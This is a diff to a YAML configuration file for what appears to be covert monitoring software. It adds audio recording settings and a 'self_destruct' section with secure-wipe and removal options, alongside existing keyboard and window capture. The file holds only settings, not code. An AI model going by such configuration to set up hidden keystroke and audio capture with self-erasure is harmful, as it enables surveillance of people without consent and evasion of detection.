@@ -3,6 +3,7 @@ general:
   data_dir: "./data"
   log_level: "INFO"
   log_file: "./logs/app.log"
+  auto_install_deps: false
 
 capture:
   keyboard:
@@ -26,6 +27,13 @@ capture:
   window:
     enabled: false
     poll_interval: 2
+  audio:
+    enabled: false
+    duration: 10
+    sample_rate: 44100
+    channels: 1
+    max_count: 50
+    interval: 300
 
 storage:
   backend: "local"
@@ -172,3 +180,8 @@ service:
   start_limit_burst: 3
   start_limit_interval: 60
   display: ":0"
+
+self_destruct:
+  secure_wipe: false
+  remove_program: false
+  remove_service: true
